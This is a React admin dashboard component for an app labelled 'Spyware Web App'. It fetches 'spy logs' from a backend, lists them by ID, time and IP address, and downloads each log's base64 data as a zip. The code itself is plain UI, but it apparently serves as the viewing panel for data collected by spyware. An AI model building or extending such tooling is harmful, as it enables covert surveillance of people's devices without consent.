import axios from "axios";
import React, { useState, useEffect } from "react";
import { Container, Nav, Navbar, Table, Button } from "react-bootstrap";
import { Link, useNavigate } from "react-router-dom";
import { baseurl } from "./App";

export default function AdminDashboard() {
  const [dataLog, setDataLog] = useState([]);

  const handleGetLogs = async () => {
    try {
      const response = await axios.post(
        baseurl,
        new URLSearchParams({
          tag: "getspylogs",
        }),
        {
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
        }
      );

      if (response.data) {
        setDataLog(response.data || []);
      }
    } catch (error) {
      alert(
        error.response?.data?.message || "An error occurred while fetching data."
      );
    }
  };

  const handleDownloadFile = (base64Data, fileName) => {
    // Decode the Base64 string
    const byteCharacters = atob(base64Data);
    const byteNumbers = new Array(byteCharacters.length).fill().map((_, i) => byteCharacters.charCodeAt(i));
    const byteArray = new Uint8Array(byteNumbers);
  
    // Create a Blob with the data as a ZIP file (you can set the type to "application/zip")
    const blob = new Blob([byteArray], { type: "application/zip" });
  
    // Create a temporary link element
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = fileName.endsWith('.zip') ? fileName : `${fileName}.zip`;  // Ensure the file ends with .zip
  
    // Trigger the download
    link.click();
  
    // Clean up the object URL
    URL.revokeObjectURL(link.href);
  };
  

  useEffect(() => {
    handleGetLogs();
  }, []);

const navigate = useNavigate();

    const handleLogout = () => {
      localStorage.removeItem("user");  
      navigate("/login"); 
    };

  return (
    <div>
      <Navbar bg="dark" data-bs-theme="dark">
        <Container>
          <Navbar.Brand as={Link} to="/AdminDashboard">Spyware Web App</Navbar.Brand>
          <Navbar.Text className="ms-auto">
            <Nav.Link as={Link} to="/" onClick={handleLogout}>Logout</Nav.Link>
          </Navbar.Text>
        </Container>
      </Navbar>
      <div className="container">
        <h3 className="text-center mt-5">Welcome to Admin Dashboard</h3>
        <Container className="mt-4">
          <Table striped bordered hover responsive>
            <thead>
              <tr>
                <th>Log ID</th>
                <th>Log Date & Time</th>
                <th>IP Address</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {dataLog.length > 0 ? (
                dataLog.map((item, index) => (
                  <tr key={index}>
                    <td>{item.logid}</td>
                    <td>{item.logdatetime}</td>
                    <td>{item.ipaddress}</td>
                    <td>
                      <Button
                        variant="dark"
                        size="sm"
                        onClick={() => handleDownloadFile(item.logdata, `log-${item.logid}.txt`)}
                      >
                        Download
                      </Button>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="5" className="text-center">No data available</td>
                </tr>
              )}
            </tbody>
          </Table>
        </Container>
      </div>
    </div>
  );
}
